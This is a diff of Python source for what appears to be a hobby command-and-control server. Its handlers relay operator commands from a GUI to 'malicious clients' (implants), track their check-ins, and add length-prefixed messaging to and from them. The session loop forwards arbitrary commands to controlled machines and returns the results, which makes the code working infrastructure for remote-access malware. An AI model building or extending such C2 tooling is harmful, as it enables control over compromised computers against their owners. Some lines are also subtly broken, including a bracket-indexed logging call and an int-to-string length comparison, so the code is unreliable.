@@ -513,7 +513,7 @@ class ServerFriendlyClientHandler:
             
             ## telling client to go into a listening loop, client sends back an okay, otherwise this hangs
             ## as it's waiting for a response
-            self.client.send_msg("session\\|/session")
+            self.client.send_msg_to_maliciousclient("session\\|/session")
             
             while True: #self.client.under_control:
                 #logging.debug(f"[Server (session with {self.client.fullname})]")
@@ -523,7 +523,7 @@ class ServerFriendlyClientHandler:
                     print("SESSION LOOP")
                     ## listen for friendly client
                     #a = bytes_decode(self.conn.recv(1024))
-                    a = self.recieve_msg_from_client(self.conn)
+                    a = self.recieve_msg_from_client()
                     #print(a)
                     
                     #
@@ -538,13 +538,22 @@ class ServerFriendlyClientHandler:
                     
                     else:
                         print("else")
-                        results = self.client.send_msg(f"{session_command}\\|/{session_command_value}")
+                        ## sending to client
+                        self.client.send_msg_to_maliciousclient(f"{session_command}\\|/{session_command_value}")
+                        ##listening back for response
+                        results = self.client.recieve_msg_from_maliciousclient()
                         self.send_msg_to_friendlyclient(results)
                     
                     print("loop")
                 except Exception as e:
                     print(e)
-                
+        
+        ## if command unknown, wait
+        else:
+            logging.debug[f"[Server -> Client ({client_name})] Command unknown, Wait"]
+            self.client.send_msg_to_maliciousclient(f"wait\\|/wait")
+            ##listening back for response
+            results = self.client.recieve_msg_from_maliciousclient()
         
         ## if commandfromgui = session
             ## self.client.under_control = True (tells client to not do checkins)
@@ -677,18 +686,10 @@ class ServerFriendlyClientHandler:
 ## Malicious Client Handler
 ################ 
 """
-    Desc:  This class is called on a per malcious client basis, and handles the commands being sent to said malicious clients. Multiple instances of this
-    class are created, one for each client that checks in. Those instances are interacted with through the ServerFriendlyClientHanlder instances. 
     
-    Flow (extends the ServerFriendlyclientHandler flow)
-    
-    <IGNORE THIS>
-    if header is !_clientcommand_! client_decision_tree -> calls client class instance -> client class instance handles command, formats if necesary (self.current_job), and sends to client when it checsk in->
-     (continued) client class instance recieves response, and RETURNS the response back to the ServerFriendlyclientHandler instance, which sends that data to the requesting friendly client
-    </IGNORE THIS>
-    
-    Update: This class does nothing actively, and only gets called on when its created, and when a message needs to be sent to a client via the send_msg. It's a work
-    in progress
+    Desc: This class doesn't do much actively, and only gets called on when its created, and when a message needs to be sent to a client via the send_msg. 
+    Basically, it's a glorified object for each client that holds the connection info, the connection, and can send/receieve messages with that client.
+    It's a work in progress. 
     
     Additionally, and this is newer, it updates JSON keys for the malicious client, with info on said malicious client for GUI stuff (i.e. client viewer)
 """
@@ -749,109 +750,89 @@ class ServerMaliciousClientHandler:
         #client_127_0_0_1_FAUNI
         ## Runs every checkin, howeer the method will not write data if a record of this client exists
         Data.json_new_client(json.dumps(new_client))
-        
-        '''while message:
-            self.interact()
-            
-            if not message: 
-                break
-            message = None
-        
-        ## Closing connection so a session doesn't stay established with the client
-        conn.close()'''
-        #self.interact()
-        
-        """
-        ##basically, if being controlled, don't send anything, but once it's not being controlled, continue and send wait until next checkin
-        #if self.under_control = True
-        while self.under_control
-            pass
-            
-        #else:
-            #send wait
-        
-        send_msg("wait")
-        
-        """
-        
-                
-        ##fclient calls interact, passes user_input & command value
-        
-        ## if job not wait, interact sends keepalive, which (client side) loops the communication. 
-        
-        ## On loop, client listens for recv, runs command, and sends back. Loops again and so on
-        
-        ## on wait, client exits that loop, and checks in every X sleep time
-        
-        ##=============
-        """
-            Connection is passed here after established. when established, need to determine whether to tell it to sleep, or continue interacting. Additionally, we
-            need to figure out how to trigger an interact from the gui. 
-            
-            maybe: if job = interact, interact loop. Fclient would have to tell interact that the current job is interact, and on the next checkin, the server
-            will tell the client to interact
-            
-        
-        
-        """
-        
-    '''def fclient_interact(self, user_input_raw, command_value):
-        self.current_job = "stuff"
-        
-        return "results"
-
-    def interact(self, user_input_raw="heartbeat", command_value=None):
-        """
-            If a command has to need a specail formatting, it gets it's own "if", otherwise
-            commands are fired blindly at the client. Yes this could be a problem in the future, but it's alot easier than
-            adding every freaking command possibel here
-            
-            Note, just keep it in the back of your head to test cmd injection here
-            
-            In a nutshell, this is how this works.
-            
-            On connection, 'interact' is called. if user_input_raw isn't supplied (aka it's just checking in, and no job has been supplied to it), 
-            it defaults to heartbeat. This results in a job of wait. 
-            
-            If user_input_raw does contain something, then that command is sent over to the malicious client on next check in.
-            
-            The client sends back it's response, and that response is returned to the calling function, which if from a friendly client, gets sent back to the friendly client.
-            
-        """
-        user_input = user_input_raw.lower()
-
-        ## checkin
-        if self.current_job == "":
-            self.current_job = "wait\\|/wait"
-            self.send_msg(self.current_job)
-        
-        else:
-            self.send_msg("keepalive\\|/keepalive")
-            ## receives ok on keepalive msg
-            while True:
-                if self.current_job != "break":
-                    self.current_response = self.send_msg(self.current_job)
-                else:
-                    break
-                
-            self.send_msg("deadbeef\\|/deadbeef")'''
     
     def cleanup(self):
         self.current_job = "wait\\|/wait"
     
-    def send_msg(self, message):
-        ##Message goes TO malicious client, and this listens for a response
-        try:
-            self.conn.send(str_encode(message))
-            print("waiting on server to talk back")
+    def send_msg_to_maliciousclient(self, msg:str):
+        ## lazy fix to map self.conn to conn
+        conn = self.conn
+        
+        ## clients need to have a shared known header beforehand. Default is 10
+        HEADER_BYTES = 10
+        BUFFER = 1024
+        
+        ## get the length of the message in bytes
+        msg_length = len(msg)
+        
+        ## create a header for the message that includes the length of the message
+        header = str_encode(str(msg_length).zfill(HEADER_BYTES))#.encode()
+        
+        ## send the header followed by the message in chunks
+        print(f"SENDING HEADER: {header}")
+        conn.send(header)
+        
+        for i in range(0, math.ceil(msg_length/BUFFER)):
             
-            response = bytes_decode(self.conn.recv(1024))
-            print(f"response: {response}")
-            
-            return response
+            try:
+                ## gets the right spot in the message in a loop
+                chunk = msg[i*BUFFER:(i+1)*BUFFER]
+                print(f"SENDING CHUNK: {chunk}")
+                conn.send(str_encode(chunk))
+            except Exception as e:
+                print(f"error sending: {e}")
+        
+        #recv_msg = self.recieve_msg_from_maliciousclient()
+        #return recv_msg
 
-        except Exception as e:
-            logging.debug(f"[Server ({self.id})] Error: {e}")
+    def recieve_msg_from_maliciousclient(self) -> str:
+        conn = self.conn
+        complete_msg = ""
+        ## clients need to have a shared known header beforehand. Default is 10
+        HEADER_BYTES = 10
+        BUFFER = 1024
+        header_value = 0
+        header_contents = ""
+        
+        msg_bytes_recieved_so_far = 0
+        
+        print(f"WAITING ON HEADER TO BE SENT:")
+        header_msg_length = conn.recv(HEADER_BYTES).decode() #int(bytes_decode(msg)
+        print("HEADER:" + header_msg_length)
+        
+        ## getting the amount of chunks/iterations eneded at 1024 bytes a message
+        chunks = math.ceil(int(header_msg_length)/BUFFER)
+        
+        complete_msg = "" #bytes_decode(msg)[10:]
+        
+        #while True:
+        for i in range(0, chunks):
+            print(f"WAITING TO RECEIEVE CHUNK {i + 1}/{chunks}:")
+            msg = conn.recv(BUFFER)  # << adjustble, how many bytes you want to get per iteration
+            
+            ## getting the amount of bytes sent so far
+            msg_bytes_recieved_so_far = msg_bytes_recieved_so_far + len(bytes_decode(msg))
+
+            complete_msg += bytes_decode(msg)
+            
+            print(bytes_decode(msg))
+            
+            print(f"""DEBUG:
+                Full Message Length (based on header value) {header_msg_length}
+                Header size: {HEADER_BYTES}
+
+                Size of message recieved so far: {msg_bytes_recieved_so_far}  
+                
+                Chunks: {chunks}          
+                
+                """)
+            
+            ## if complete_msg is the same length as what the headers says, consider it complete. 
+            if len(complete_msg) == header_msg_length:
+                print("MSG TRANSFER COMPLETE")
+        
+        print("VALUE OF MSG: \n" + complete_msg)
+        return complete_msg
             
 
 ################
